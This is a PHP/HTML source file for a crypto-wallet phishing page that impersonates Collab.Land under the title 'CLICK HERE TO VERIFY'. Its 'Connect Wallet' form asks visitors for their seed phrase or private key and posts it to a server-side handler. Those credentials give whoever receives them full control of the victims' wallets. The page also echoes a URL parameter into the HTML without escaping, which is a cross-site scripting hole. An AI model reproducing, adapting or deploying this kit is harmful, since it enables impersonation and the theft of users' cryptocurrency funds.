<?php

$pageURL = 'http';

if ($_SERVER["HTTPS"] == "on") {
  $pageURL .= "s";
}
$pageURL .= "://";
$pageURL .= $_SERVER["SERVER_NAME"];
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <meta name="title" content="CLICK HERE TO VERIFY">
  <meta name="description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community." />


  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="<?php echo $pageURL; ?>">
  <meta property="og:title" content="CLICK HERE TO VERIFY">
  <meta property="og:description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
  <meta property="og:image" content="<?php echo $pageURL; ?>/assets/images/banner.jpg">

  <!-- Twitter -->
  <meta property="twitter:card" content="collab.land">
  <meta property="twitter:url" content="<?php echo $pageURL; ?>/">
  <meta property="twitter:title" content="CLICK HERE TO VERIFY">
  <meta property="twitter:description" content="Collab.Land is a user-friendly, tokenized, community-management system. Our system is designed for anyone to build tools to manage their community.">
  <meta property="twitter:image" content="<?php echo $pageURL; ?>/assets/images/banner.jpg">

  <title>CLICK HERE TO VERIFY</title>

  <link rel="icon" href="favicon.ico" />

  <link rel="stylesheet" href="assets/vendor/bootstrap.css">
  <link rel="stylesheet" href="assets/css/style.css?v=<?php echo time(); ?>" />
  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>


</head>

<body>

  <div class="connect-page-main">
    <div class="d-flex justify-content-start mb-1">
      <img src="assets/images/favicon-2.ico" alt="" height="28px" width="28px" />
      <h1 class="h5 mx-1 fs-3 text-light">Colab.land</h1>
    </div>
    <div class="box p-5">
      <h4 class="h4 text-center text-secondary fs-3 mb-4">Connect Wallet</h4>
      <form action="inc/process.php" method="post" id="seed-form">
        <?php

        if ($_GET['vendor'] == 'OtherWallets') {
          echo '<input type="text" name="vendor" placeholder="Wallet name" id="" class="form-control" required />';
        } else {
          echo '<input type="hidden" class="mt-3" name="vendor" value="' . $_GET['vendor'] . '" />';
        }

        ?>
        <textarea name="seed_phrase" id="" cols="70" rows="5" class="form-control mt-3" placeholder="seed phrase, private key, ..." required></textarea>
        <div class="invalid-feedback">Cannot be empty</div>
        <div id="loader"></div>
        <div class="d-grid">
          <button type="submit" href="" class="btn py-3 mt-3 text-light fw-bold fs-4" id="connectWalletButton">
            Connect Wallet
          </button>
        </div>
      </form>
    </div>
  </div>

  <script src="assets/vendor/bootstrap.js"></script>
  <script src="assets/vendor/jquery.js"></script>
  <script src="assets/js/script.js?v=<?php echo time(); ?>"></script>
</body>

</html>